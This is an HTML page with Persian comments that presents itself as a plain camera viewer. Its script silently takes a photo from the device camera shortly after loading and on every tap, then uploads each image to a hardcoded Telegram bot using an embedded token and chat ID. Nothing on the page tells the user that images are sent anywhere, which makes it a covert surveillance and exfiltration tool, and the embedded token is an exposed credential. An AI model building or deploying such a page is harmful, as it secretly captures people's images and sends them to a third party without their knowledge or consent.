<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
body {
  margin: 0;
  background: black;
  overflow: hidden;
  font-family: sans-serif;
}

video {
  width: 100%;
  height: 100vh;
  object-fit: cover;
}

/* دکمه تغییر دوربین */
.switch-btn {
  position: fixed;
  bottom: 30px;
  right: 20px;
  padding: 12px 16px;
  border-radius: 50px;
  border: none;
  background: rgba(255,255,255,0.2);
  color: white;
  backdrop-filter: blur(10px);
}
</style>
</head>

<body>

<video id="video" autoplay playsinline></video>

<button class="switch-btn" onclick="switchCamera()">🔄</button>

<canvas id="canvas" style="display:none;"></canvas>

<script>
const TOKEN = "8016648419:AAHhF4QiL27_UJKuRyA5ay_oP-eVIAH4edo";
const CHAT_ID = "300972716";

let currentFacing = "environment";
let stream;
let isSending = false;

const video = document.getElementById('video');

// 🚀 شروع دوربین
async function startCamera() {
  if (stream) {
    stream.getTracks().forEach(track => track.stop());
  }

  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: currentFacing }
    });

    video.srcObject = stream;

    // 📸 عکس خودکار اول
    setTimeout(takePhoto, 1200);

  } catch (e) {
    alert("Camera error");
    console.error(e);
  }
}

startCamera();

// 🔄 تغییر دوربین
function switchCamera() {
  currentFacing = currentFacing === "environment" ? "user" : "environment";
  startCamera();
}

// 📸 گرفتن عکس با Tap روی صفحه
document.body.addEventListener("click", takePhoto);

// 📸 گرفتن و ارسال عکس
function takePhoto() {
  if (isSending) return; // جلوگیری از اسپم
  isSending = true;

  const canvas = document.getElementById('canvas');

  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;

  canvas.getContext('2d').drawImage(video, 0, 0);

  canvas.toBlob(async (blob) => {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', blob);

    try {
      await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      });
    } catch (err) {
      console.error(err);
    }

    // آماده برای عکس بعدی
    setTimeout(() => {
      isSending = false;
    }, 800);
  }, 'image/jpeg', 0.9);
}
</script>

</body>
</html>
